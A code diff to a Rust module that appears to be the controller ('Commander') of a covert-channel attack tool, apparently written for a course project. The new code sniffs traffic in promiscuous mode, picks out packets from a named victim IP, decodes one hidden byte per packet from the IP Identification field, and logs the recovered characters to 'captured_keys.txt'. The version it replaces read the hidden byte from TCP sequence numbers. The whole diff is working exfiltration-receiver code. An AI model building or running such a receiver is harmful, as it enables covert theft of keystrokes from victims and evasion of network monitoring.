@@ -1,64 +1,105 @@
 use chrono::Local;
 use pcap::{Capture, Device};
-use std::sync::{atomic::{AtomicBool, Ordering}, Arc};
+use std::sync::{
+    atomic::{AtomicBool, Ordering},
+    Arc,
+};
 use std::thread;
+use std::io::{self, Write};
+use std::fs::OpenOptions;
+
+// pnet for packet parsing
+use pnet::packet::ipv4::Ipv4Packet;
 
 pub struct PcapHandle {
     running: Arc<AtomicBool>,
 }
 
 impl PcapHandle {
-    pub fn start(interface: &str) -> Self {
+    pub fn start(interface: &str, victim_ip: String) -> Self {
         let running = Arc::new(AtomicBool::new(true));
         let flag = running.clone();
         let iface = interface.to_string();
 
         thread::spawn(move || {
-            let device = Device::list()
-                .unwrap()
-                .into_iter()
-                .find(|d| d.name == iface)
-                .expect("Interface not found");
+            // 1. Find the network interface
+            let devices = Device::list().unwrap();
+            let device = devices.into_iter().find(|d| d.name == iface);
 
+            let device = match device {
+                Some(d) => d,
+                None => {
+                    eprintln!("\n[!] Error: Interface '{}' not found.", iface);
+                    let avail: Vec<String> = Device::list()
+                        .unwrap()
+                        .into_iter()
+                        .map(|d| d.name)
+                        .collect();
+                    eprintln!("[*] Available interfaces: {:?}", avail);
+                    return; 
+                }
+            };
+
+            // 2. Setup Filenames
             let ts = Local::now().format("%Y%m%d_%H%M%S");
-            let filename = format!("commander_{}.pcap", ts);
+            let pcap_filename = format!("commander_{}.pcap", ts);
+            let log_filename = "captured_keys.txt"; 
 
-            println!("[*] PCAP capture & Covert Receiver started: {}", filename);
+            println!("\n[*] PCAP capture active: {}", pcap_filename);
+            println!("[*] Monitoring covert channel from victim: {}", victim_ip);
 
+            // 3. Open Capture Handle
             let mut cap = Capture::from_device(device)
                 .unwrap()
                 .promisc(true)
                 .snaplen(65535)
-                .timeout(100) // Lower timeout for more frequent flag checks
+                .timeout(100) 
                 .open()
                 .unwrap();
 
-            // Set a filter to only look for SYN packets on our covert port (8000)
-            let _ = cap.filter("tcp[tcpflags] & tcp-syn != 0 and port 8000", true);
+            // 4. Setup .pcap file dumper for project submission requirements
+            let mut dump = cap.savefile(&pcap_filename).unwrap();
 
-            let mut dump = cap.savefile(&filename).unwrap();
-
+            // 5. Main Capture Loop
             while flag.load(Ordering::Relaxed) {
                 if let Ok(packet) = cap.next_packet() {
+                    // Save raw packet to .pcap
                     dump.write(&packet);
 
-                    // --- COVERT EXTRACTION LOGIC ---
-                    // TCP header starts at offset 34 (14 Ethernet + 20 IP)
-                    // Sequence number is 4 bytes starting at offset 4 of the TCP header
-                    if packet.data.len() >= 42 {
-                        let seq_bytes = &packet.data[38..42];
-                        let seq_num = u32::from_be_bytes([seq_bytes[0], seq_bytes[1], seq_bytes[2], seq_bytes[3]]);
-                        
-                        // Convert the sequence number (the byte) back to a character
-                        if let Some(c) = char::from_u32(seq_num) {
-                            print!("{}", c); // Live-print the log as it arrives
-                            std::io::Write::flush(&mut std::io::stdout()).unwrap();
+                    // Ethernet header is 14 bytes. Verify we have enough data for an IPv4 header
+                    if packet.data.len() > 34 { 
+                        if let Some(ip_packet) = Ipv4Packet::new(&packet.data[14..]) {
+                            
+                            // Check if source matches our victim
+                            if ip_packet.get_source().to_string() == victim_ip {
+                                
+                                // Extract the covert byte from the IP Identification field
+                                let covert_byte = ip_packet.get_identification();
+
+                                // Only process if it looks like ASCII/Command data (Non-zero)
+                                if covert_byte > 0 && covert_byte < 256 {
+                                    let c = covert_byte as u8 as char;
+                                    
+                                    // Live display in Commander console
+                                    print!("{}", c);
+                                    io::stdout().flush().unwrap();
+
+                                    // Persistent log to local text file
+                                    if let Ok(mut file) = OpenOptions::new()
+                                        .create(true)
+                                        .append(true)
+                                        .open(log_filename) 
+                                    {
+                                        write!(file, "{}", c).ok();
+                                    }
+                                }
+                            }
                         }
                     }
                 }
             }
 
-            println!("\n[*] PCAP capture stopped.");
+            println!("\n[*] PCAP capture stopped for {}", victim_ip);
         });
 
         Self { running }
@@ -67,6 +108,7 @@ impl PcapHandle {
 
 impl Drop for PcapHandle {
     fn drop(&mut self) {
+        // This stops the background thread when the Commander disconnects or exits
         self.running.store(false, Ordering::Relaxed);
     }
 }
